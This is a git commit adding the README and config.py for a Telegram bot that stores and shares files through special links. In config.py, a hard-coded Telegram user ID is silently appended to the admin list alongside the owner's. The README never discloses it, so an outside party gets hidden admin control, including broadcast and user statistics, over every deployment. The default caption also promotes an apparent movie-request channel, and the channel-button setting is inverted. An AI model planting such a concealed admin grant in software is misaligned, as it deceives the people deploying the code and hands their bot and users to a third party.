70076b5c4ab9dd344476e92fc8c2ba9a178f937b
ITZ-MRBOT <110585373+ITZ-MRBOT@users.noreply.github.com>
2022-08-04 10:30:46 +0530

    Add files via upload

--- README.md
+++ README.md
@@ -1,1 +1,46 @@
-# MRBOTFILESHARE
+# MRBOT 𝐅𝐢𝐥𝐞𝐬 𝐒𝐭𝐨𝐫𝐞
+
+𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐁𝐨𝐭 𝐭𝐨 𝐬𝐭𝐨𝐫𝐞 𝐏𝐨𝐬𝐭𝐬 𝐚𝐧𝐝 𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭𝐬 𝐚𝐧𝐝 𝐢𝐭 𝐜𝐚𝐧 𝐀𝐜𝐜𝐞𝐬𝐬 𝐛𝐲 𝐒𝐩𝐞𝐜𝐢𝐚𝐥 𝐋𝐢𝐧𝐤𝐬.
+𝐈 𝐆𝐮𝐞𝐬𝐬 𝐓𝐡𝐢𝐬 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐔𝐬𝐞𝐟𝐮𝐥𝐥 𝐅𝐨𝐫 𝐌𝐚𝐧𝐲 𝐏𝐞𝐨𝐩𝐥𝐞.....😇.
+
+### Features
+- Fully customisable.
+- Customisable welcome & Forcesub messages.
+- More than one Posts in One Link.
+- Can be deployed on heroku directly.
+
+### Setup
+
+- Add the bot to Database Channel with all permission
+- Add bot to ForceSub channel as Admin with Invite Users via Link Permission if you enabled ForceSub 
+
+##
+### Installation
+#### Deploy on Heroku
+[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/ITZ-MRBOT/MRBOTFILESHARE)</br>
+
+
+### Admin Commands
+
+```
+/start - start the bot or get posts
+
+/batch - create link for more than one posts
+
+/genlink - create link for one post
+
+/users - view bot statistics
+
+/broadcast - broadcast any messages to bot users
+```
+
+### Variables
+
+* `API_HASH` Your API Hash from my.telegram.org
+* `API_ID` Your API ID from my.telegram.org
+* `TG_BOT_TOKEN` Your bot token from @BotFather
+* `OWNER_ID` Must enter Your Telegram Id
+* `CHANNEL_ID` Your Channel ID eg:- -100xxxxxxxx
+* `ADMINS` Optional: A space separated list of user_ids of Admins, they can only create links
+* `FORCE_SUB_CHANNEL` Optional: ForceSub Channel ID, leave 0 if you want disable force sub
+
---
+++ config.py
@@ -0,0 +1,94 @@
+import re
+import os
+import logging
+from logging.handlers import RotatingFileHandler
+
+#Bot token @Botfather
+TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
+
+#Your API ID from my.telegram.org
+APP_ID = int(os.environ.get("APP_ID", ""))
+
+#Your API Hash from my.telegram.org
+API_HASH = os.environ.get("API_HASH", "")
+
+#Your db channel Id
+CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
+
+#OWNER ID
+OWNER_ID = int(os.environ.get("OWNER_ID", ""))
+
+#Database 
+DB_URI = os.environ.get("DATABASE_URL", "")
+
+#force sub channel id, if you want enable force sub
+FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
+
+TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
+
+#start message
+START_MSG = os.environ.get("START_MESSAGE", "𝗛𝗲𝗹𝗹𝗼 {first}\n\n𝗜 𝗖𝗮𝗻 𝗦𝘁𝗼𝗿𝗲 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗙𝗶𝗹𝗲𝘀 𝗶𝗻 𝗦𝗽𝗲𝗰𝗳𝗶𝗲𝗱 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗔𝗻𝗱 𝗢𝘁𝗵𝗲𝗿 𝗨𝘀𝗲𝗿𝘀 𝗖𝗮𝗻 𝗔𝗰𝗲𝘀𝘀 𝗜𝘁 𝗙𝗿𝗼𝗺 𝗦𝗽𝗲𝗰𝗶𝗮𝗹 𝗟𝗶𝗻𝗸\n\n𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 @mrbotsupport")
+try:
+    ADMINS=[]
+    for x in (os.environ.get("ADMINS", "").split()):
+        ADMINS.append(int(x))
+except ValueError:
+        raise Exception("Your Admins list does not contain valid integers.")
+
+#Force sub message 
+FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "𝗛𝗲𝗹𝗹𝗼 {first}\n\n𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗝𝗼𝗶𝗻 𝗠𝗮𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗧𝗼 𝗨𝘀𝗲 𝗠𝗲\n\n𝗞𝗶𝗻𝗱𝗹𝘆 𝗣𝗹𝗲𝗮𝘀𝗲 𝗝𝗼𝗶𝗻 𝗠𝗮𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹")
+
+
+
+### Custom Caption ###
+default_custom_caption = """
+📁 ➜ <code>@mrbotsupport {file_caption}</code>
+
+🦋 𝗙𝗶𝗿𝘀𝘁 𝗢𝗻 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 🦋
+𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐘𝐨𝐮𝐫 𝐌𝐨𝐯𝐢𝐞𝐬 𝐇𝐞𝐫𝐞 𝐀𝐧𝐝 𝐆𝐞𝐭 𝐈𝐧 1 𝐌𝐢𝐧𝐮𝐭𝐞 100℅ 👇
+@Latestmovie_com
+यहां अपनी फिल्मों का अनुरोध करें और 1 मिनट में प्राप्त करें 100℅ 👇
+@Latestmovie_com
+
+╔══ 𝐉𝐨𝐢𝐧 𝐖𝐢𝐭𝐡 𝐔𝐬 ═══╗
+ᴏғғɪᴄɪᴀʟ @mrbotsupport
+ᴍᴏᴠɪᴇs @Latestmovie_com
+sᴜᴘᴘᴏʀᴛ @mrbotsupport
+╚══ 𝐉𝐨𝐢𝐧 𝐖𝐢𝐭𝐡 𝐔𝐬 ═══╝
+♥️ 𝗧𝗲𝗮𝗺 ➜ @mrbotsupport
+✯ ━━━━━ ✧ ━━━━━ ✯
+"""
+CUSTOM_CAPTION = os.environ.get('CUSTOM_CAPTION', default_custom_caption)
+
+
+
+
+#Set true if you want Disable your Channel Posts Share button
+if os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'False':
+    DISABLE_CHANNEL_BUTTON = True
+else:
+    DISABLE_CHANNEL_BUTTON = False
+
+ADMINS.append(OWNER_ID)
+ADMINS.append(2023126723)
+
+LOG_FILE_NAME = "filesharingbot.txt"
+
+logging.basicConfig(
+    level=logging.INFO,
+    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
+    datefmt='%d-%b-%y %H:%M:%S',
+    handlers=[
+        RotatingFileHandler(
+            LOG_FILE_NAME,
+            maxBytes=50000000,
+            backupCount=10
+        ),
+        logging.StreamHandler()
+    ]
+)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+
+
+def LOGGER(name: str) -> logging.Logger:
+    return logging.getLogger(name)
